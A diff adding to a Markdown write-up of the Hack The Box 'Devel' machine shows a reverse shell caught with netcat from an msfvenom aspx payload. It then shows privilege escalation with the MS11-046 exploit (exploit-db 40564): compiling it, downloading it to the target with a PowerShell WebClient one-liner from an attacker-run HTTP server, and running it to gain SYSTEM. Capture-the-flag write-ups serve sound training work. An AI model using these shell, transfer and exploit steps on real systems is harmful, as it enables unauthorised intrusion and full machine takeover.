@@ -318,9 +318,196 @@ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=Your IP LPORT=4444 -o revers
 ```
 
 Once done, you can visit `/reverse-shell.aspx`, turn on netcat listener and get back a reverse shell
+
 ```
-nc -lvnp 4444
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
+└─$ nc -lvnp 4444    
+listening on [any] 4444 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.5] 49175
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\web
+
+c:\windows\system32\inetsrv>
+```
+
+I, then, changed to the `Users` directory to retrieve the flag
+
+```
+c:\windows\system32\inetsrv>cd c:\users
+cd c:\users
+
+c:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users
+
+18/03/2017  01:16 ��    <DIR>          .
+18/03/2017  01:16 ��    <DIR>          ..
+18/03/2017  01:16 ��    <DIR>          Administrator
+17/03/2017  04:17 ��    <DIR>          babis
+18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
+14/07/2009  09:20 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   4.697.743.360 bytes free
+
+c:\Users>cd babis
+cd babis
+Access is denied.
+
+c:\Users>cd Administrator
+cd Administrator
+Access is denied.
+```
+
+There was a user `babis` and `Administrator` directory and I was denied access to both of them.
+
+## Privilege Escalation
+So, then, the first thing I looked at was `systeminfo` to find out the `OS Name`, `System Type`, and other stuff
+
+![dvl-5](https://user-images.githubusercontent.com/87711310/215333489-6e133fb6-cc27-4d16-bf7e-6f1e0f78b730.png)
+
+Since, I was running `Windows 7 Enterprise`, I was pretty sure that it was vulnerable to bunch of exploits.
+
+So, I instantly use google to look for exploits.
+
+![dvl-6](https://user-images.githubusercontent.com/87711310/215333583-ab21e6ed-9c37-4764-ae99-1c4ec43d2237.png)
+
+I found the [Local Privilege Escalation](https://www.exploit-db.com/exploits/40564), which was well documented.
+
+So I just hoped into my machine and searched for the same exploit using `searchsploit` with the help of the `EDB-ID` given on the exploit-db web-page
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
+└─$ searchsploit -m 40564
+  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
+      URL: https://www.exploit-db.com/exploits/40564
+     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
+File Type: C source, ASCII text
+
+Copied to: /home/kali/Desktop/HackTheBox/Windows-boxes/Devel/40564.c
+```
+
+The exploit was written in `C` so it required to be compiled first and the detailed instructions were given in the exploit-db page.
+
+The compilation process required `mingw-w64` to be installed, so if you don't have `mingw-w64` you can install it using following commands:
+```
+apt-get update
+apt-get install mingw-w64
+```
+
+Then, compile it using the listed command: 
+```
+i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
+```
+
+Now that the file is compiled, I had to transfer it to the machine 
+
+I started up a server on my machine 
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Devel]
+└─$ python -m http.server 9999
+Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 ```
 
 
+Running the following `powershell` script to download the file from the server running on my local machine
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2:9999/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
+```
 
+```
+c:\Users>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2:9999/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2:9999/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
+
+c:\Users>dir c:\Users\Public\Downloads\
+dir c:\Users\Public\Downloads\
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Public\Downloads
+
+29/01/2023  04:50 ��    <DIR>          .
+29/01/2023  04:50 ��    <DIR>          ..
+29/01/2023  04:51 ��           250.295 40564.exe
+               1 File(s)        250.295 bytes
+               2 Dir(s)   4.697.464.832 bytes free
+```
+
+Now that the file was downloaded, all I needed to do is to execute the file.
+
+```
+c:\Users\Public\Downloads>40564.exe
+40564.exe
+
+c:\Windows\System32>whoami
+whoami
+nt authority\system
+
+c:\Windows\System32>
+```
+
+Now that I was `nt authority\system` which is equivalent to `root` in debian based system, I could retrieve both, `user's` and the `root's` flag.
+
+```
+c:\Windows\System32>cd c:\users
+cd c:\users
+
+c:\Users>cd babis
+cd babis
+
+c:\Users\babis>cd Desktop
+cd Desktop
+
+c:\Users\babis\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\babis\Desktop
+
+11/02/2022  03:54 ��    <DIR>          .
+11/02/2022  03:54 ��    <DIR>          ..
+29/01/2023  02:52 ��                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4.697.452.544 bytes free
+
+c:\Users\babis\Desktop>type user.txt
+type user.txt
+[REDACTED]
+
+c:\Users\babis\Desktop>cd ..
+cd ..
+
+c:\Users\babis>cd ..
+cd ..
+
+c:\Users>cd Administrator
+cd Administrator
+
+c:\Users\Administrator>cd Desktop
+cd Desktop
+
+c:\Users\Administrator\Desktop>dir 
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Administrator\Desktop
+
+14/01/2021  11:42 ��    <DIR>          .
+14/01/2021  11:42 ��    <DIR>          ..
+29/01/2023  02:52 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4.697.452.544 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+[REDACTED]
+
+```
